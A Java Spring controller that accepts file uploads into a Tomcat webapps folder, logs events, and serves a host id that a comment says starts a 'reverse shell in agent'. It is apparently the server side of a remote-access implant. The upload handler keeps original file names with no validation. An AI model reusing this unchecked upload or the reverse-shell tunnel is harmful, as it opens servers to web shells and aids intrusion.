package com.jimmy.infaction.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.jimmy.infaction.enumn.GeneralStatus;
import com.jimmy.infaction.pojo.Event;
import com.jimmy.infaction.service.EventService;
import org.apache.ibatis.annotations.Param;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

/**
 * @author jimmy on 2019/9/24 19:29
 */
@Service
@RequestMapping("/browser")
public class BrowserController {
	private static Logger log = LoggerFactory.getLogger(BrowserController.class);
	@Autowired
	private ObjectMapper jsonMapper;
	@Autowired
	private EventService eventService;
	@RequestMapping(value = "/browserbag",method = RequestMethod.POST)
	@ResponseBody
	public ResponseEntity<Map> BrowserBag (HttpServletRequest request, @Param("file") MultipartFile file ){
		String rootPath = "/opt/tomcat/webapps/upload/";
		//本地使用,上传位置
//		String rootPath = "F:\\workspace\\infaction\\upload\\";
		Map<String, Object> res = new HashMap<String, Object>();
		try{
			//文件的完整名称,如spring.jpeg
			String filename = file.getOriginalFilename();
			//文件名,如spring
			String name = filename.substring(0,filename.indexOf("."));
			//文件后缀,如.jpeg
			String suffix = filename.substring(filename.lastIndexOf("."));
			//创建年月文件夹
//			Calendar date = Calendar.getInstance();
//			File dateDirs = new File(date.get(Calendar.YEAR)
//					+ File.separator + (date.get(Calendar.MONTH)+1));

			//目标文件
			File descFile = new File(rootPath+filename);
			int i = 1;
			//若文件存在重命名
			String newFilename = filename;
			while(descFile.exists()) {
				newFilename = name+"("+i+")"+suffix;
				String parentPath = descFile.getParent();
				descFile = new File(parentPath+File.separator+newFilename);
				i++;
			}
			//判断目标文件所在的目录是否存在
			if(!descFile.getParentFile().exists()) {
				//如果目标文件所在的目录不存在，则创建父目录
				descFile.getParentFile().mkdirs();
			}

			//将内存中的数据写入磁盘
			try {
				file.transferTo(descFile);
			} catch (Exception e) {
				e.printStackTrace();
				log.error("上传失败，cause:{}",e);
			}
			//完整的url
//			String fileUrl =  "/uploads/"+dateDirs+ "/"+newFilename;
//			MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request;
//			multipartRequest.getParameter("hostid");
			res.put("succeed",true);
			return new ResponseEntity<Map>(res,HttpStatus.OK);
		}catch(Throwable t){
			log.error(t.getMessage(),t);
			return new ResponseEntity<Map>(HttpStatus.INTERNAL_SERVER_ERROR);
		}
	}

	@RequestMapping(value = "/Event",method = RequestMethod.POST)
	@ResponseBody
	public ResponseEntity<Map> BrowserFaild(Event event){
		try{
			event.setReason(GeneralStatus.getMessage(event.getCode()));
			event.setType(GeneralStatus.getMessage((Integer.parseInt((event.getType())))));
			eventService.insert(event);
			return  new ResponseEntity<Map>(HttpStatus.OK);
		}catch (Throwable t){
			log.error(t.getMessage(),t);
			return new ResponseEntity<Map>(HttpStatus.INTERNAL_SERVER_ERROR);
		}
	}

	//  get the hostid to startup reverse shell in agent
	@RequestMapping(value = "/tunnel",method = RequestMethod.GET)
	public ResponseEntity<Map> Tunnel() {
		Map<String,Object> res = new HashMap<>();
		try{
			String hostid = eventService.findOne();
			res.put("hostid",hostid);
			return new ResponseEntity<Map>(res,HttpStatus.OK);
		}catch (Throwable t){
			log.error(t.getMessage(),t);
			return new ResponseEntity<Map>(HttpStatus.INTERNAL_SERVER_ERROR);
		}
	}
}
